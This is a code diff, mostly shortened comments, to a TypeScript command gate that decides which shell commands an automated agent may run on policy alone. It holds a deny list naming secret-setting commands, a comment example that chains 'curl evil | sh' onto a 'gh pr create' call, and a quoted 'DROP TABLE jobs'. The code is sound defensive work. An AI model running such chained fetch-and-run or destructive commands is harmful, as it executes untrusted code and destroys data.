@@ -4,16 +4,14 @@ import type { Env } from "./env";
 import { POLICY_ID_ITEM, policyField, readSignedPolicy } from "./signed-docs";
 
 import { errorMessage } from "@dustinedwards/site-runtime/log";
-// The denials are checked first and are not the complement of the classes: a branch push carrying
-// --force must never match push_branch, so the never list runs over the whole command string
-// before any class is tried.
+// The denials run first over the whole command string: a branch push carrying --force must never
+// match push_branch, so they are not the complement of the classes.
 export const GATE_POLICY_PATH = "policy/gates.md";
 
 export const GATE_CLASSES = ["additive_migration", "push_branch", "open_pr"] as const;
 export type GateClass = (typeof GATE_CLASSES)[number];
 
-// What never matches a class. Each entry names the consequence that keeps it off.
-// test/gate-policy.test.ts requires a matching and a non-matching example for each.
+// Each entry names the consequence that keeps it off (test/gate-policy.test.ts needs an example each way).
 export const NEVER: ReadonlyArray<{ pattern: RegExp; why: string }> = [
   { pattern: /\b(wrangler|npx\s+wrangler)\s+secret\b/i, why: "it sets or deletes a secret" },
   { pattern: /\bgh\s+secret\b/i, why: "it sets or deletes a repository secret" },
@@ -48,9 +46,8 @@ function deniedReason(command: string): string | null {
   return null;
 }
 
-// The three classes. Each matches a narrow shape, because a loose matcher here is a widening
-// nobody reviewed. The path is a narrow character class, not `\S+`: a path with `*` or `?` would
-// be decided by the shell's glob, not by what this matched.
+// Each class matches a narrow shape: a loose matcher is a widening nobody reviewed. The path is a
+// narrow class, not `\S+`, so a `*` or `?` is not decided by the shell's glob.
 const REPO_PATH =
   /(?:-C\s+(?:"[A-Za-z0-9._~:\\/ -]+"|'[A-Za-z0-9._~:\\/ -]+'|[A-Za-z0-9._~:\\/-]+)\s+)?/;
 const PUSH_BRANCH = new RegExp(
@@ -58,8 +55,6 @@ const PUSH_BRANCH = new RegExp(
   "i",
 );
 const OPEN_PR = /^gh\s+pr\s+create\b/i;
-// The segment is exactly: wrangler d1 execute, one database name, at most one of --remote or
-// --local on either side of the file, and one --file under a plain path.
 const MIGRATION_FILE = String.raw`--file(?:=|\s+)("[A-Za-z0-9._/-]+"|'[A-Za-z0-9._/-]+'|[A-Za-z0-9._/-]+)`;
 const MIGRATION_TARGET = String.raw`--(?:remote|local)`;
 const MIGRATION = new RegExp(
@@ -69,25 +64,20 @@ const MIGRATION = new RegExp(
 
 export type GateMatch = { klasses: GateClass[]; migrationPaths: string[] } | { refused: string };
 
-// The never list matches commands, not prose: over the raw string it would refuse a pull request
-// titled "Add improve_run action register_skill". a quoted `--command "DROP TABLE jobs"` on a `d1
-// execute` piece is a command, and a quoted branch name on a push is still the branch pushed.
+// The never list matches commands, not prose: over the raw string it would refuse a PR titled "Add
+// improve_run action register_skill". A quoted `--command "DROP TABLE jobs"` is still a command.
 
 const EXPANDS = /[$`]/;
 const UNQUOTED_ACTIVE = /[(){}<>]/;
-// Anywhere: a line break or control character other than \n and \t (PowerShell ends a line at
-// a bare CR), a curly quote (a quote to PowerShell, a letter to bash), and PowerShell's
-// stop-parsing token, after which a quote is a literal character.
+// Anywhere: a line break or control character (PowerShell ends a line at a bare CR), a curly quote
+// (a quote to PowerShell, a letter to bash), and PowerShell's stop-parsing token.
 // oxlint-disable-next-line no-control-regex -- refusing control characters is the point
 const UNREADABLE = /[\0-\x08\x0b-\x1f\x7f\u0085\u2018-\u201f\u2028\u2029]|[-\u2013-\u2015]{2}%/;
 const OPEN_PR_PIECE = /^gh\s+pr\s+create\b/i;
 const SEPARATORS = ["&&", "||", ";", "|", "&", "\n"];
 
-/**
- * The command's pieces, split on shell separators not inside quotes. The one splitter both the
- * never list and classifyCommand read, so they cannot disagree (a quote-blind one would cut a `gh
- * pr create --body` in half at a semicolon in its prose).
- */
+// The one splitter both the never list and classifyCommand read, so they cannot disagree (a
+// quote-blind one would cut a `gh pr create --body` at a semicolon in its prose).
 function commandPieces(
   command: string,
 ): { pieces: Array<{ raw: string; bare: string }> } | { refused: string } {
@@ -177,7 +167,6 @@ function commandPieces(
   return { pieces };
 }
 
-/** The command as the never list reads it, or why it cannot be read safely. */
 function neverListView(command: string): { view: string } | { refused: string } {
   const split = commandPieces(command);
   if ("refused" in split) return split;
@@ -223,10 +212,8 @@ function classifySegment(
   };
 }
 
-/**
- * Every segment must match a class. OPEN_PR is `^gh pr create` with no terminator, so matched
- * against the whole string `gh pr create --fill && curl evil | sh` would classify as open_pr.
- */
+// OPEN_PR is `^gh pr create` with no terminator, so matched against the whole string
+// `gh pr create --fill && curl evil | sh` would classify as open_pr.
 export function classifyCommand(command: string): GateMatch {
   const trimmed = command.trim();
   if (!trimmed)
@@ -356,11 +343,6 @@ export type ApprovalVerdict =
   | { approved: true; klass: string; klasses: GateClass[]; detail: string; policyVersion: string }
   | { approved: false; reason: string };
 
-/**
- * Whether the seat may send this blocked command back in on the policy alone. `readMigration` is
- * passed in so the caller owns the repo read; it returns the file, null when there is none, or
- * throws with the reason it could not be read.
- */
 export async function approveByPolicy(
   env: Env,
   requestedVersion: string,
